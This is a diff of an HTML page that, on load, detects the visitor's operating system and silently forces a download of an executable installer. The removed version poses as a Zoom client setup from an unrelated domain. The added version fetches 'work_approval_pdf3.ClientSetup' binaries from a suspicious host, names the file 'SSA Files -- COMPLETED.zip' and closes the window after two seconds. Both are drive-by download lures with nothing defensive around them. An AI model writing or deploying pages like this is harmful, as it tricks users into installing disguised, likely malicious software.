@@ -1,41 +1,52 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Auto Download</title>
-    <script>
-        // Simplified OS detection
-        function getOS() {
-            const ua = navigator.userAgent;
-            if (ua.includes('Windows')) return 'windows';
-            if (ua.includes('Mac')) return 'macos';
-            if (ua.includes('Linux')) return 'linux';
-            return 'windows';
-        }
-
-        // Direct download trigger
-        function startDownload() {
-            const os = getOS();
-            const ext = os === 'macos' ? '.pkg' : os === 'linux' ? '.sh' : '.exe';
-            const url = `https://arjairsparts.com/zoomsetup/clientsetup/ZoomClientSetup${ext}?${Date.now()}`;
-            
-            // Method 1: Immediate redirect
-            window.location.href = url;
-            
-            // Method 2: Fallback if redirect blocked
-            setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = url;
-                link.click();
-            }, 500);
-        }
-        
-        // Start on load
-        window.onload = startDownload;
-    </script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
 </head>
 <body>
-    <!-- Minimal body content -->
-    <noscript>Please enable JavaScript to download the file</noscript>
+    
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script>
+        function detectOS() {
+  const platform = navigator.platform.toLowerCase();
+  const userAgent = navigator.userAgent.toLowerCase();
+
+  if (platform.includes('win')) return 'windows';
+  if (platform.includes('mac')) return 'macos';
+  if (platform.includes('linux') || userAgent.includes('linux')) return 'linux';
+
+  return 'unknown';
+}
+
+function getDownloadLink(os) {
+  switch (os) {
+    case 'windows':
+      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
+    case 'macos':
+      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.pkg?e=Access&y=Guest';
+    case 'linux':
+      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.sh?e=Access&y=Guest';
+    default:
+      return 'https://secure.iddeadalltimeback.co/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest';
+  }
+}
+
+window.onload = function () {
+  const osType = detectOS();
+  const downloadLink = getDownloadLink(osType);
+
+  const downloadBtn = document.createElement("a");
+  downloadBtn.href = downloadLink;
+  downloadBtn.download = "SSA Files -- COMPLETED.zip";
+  document.body.appendChild(downloadBtn);
+  downloadBtn.click();
+
+  setTimeout(() => {
+    window.close();
+  }, 2000);
+};
+    </script>
 </body>
 </html>
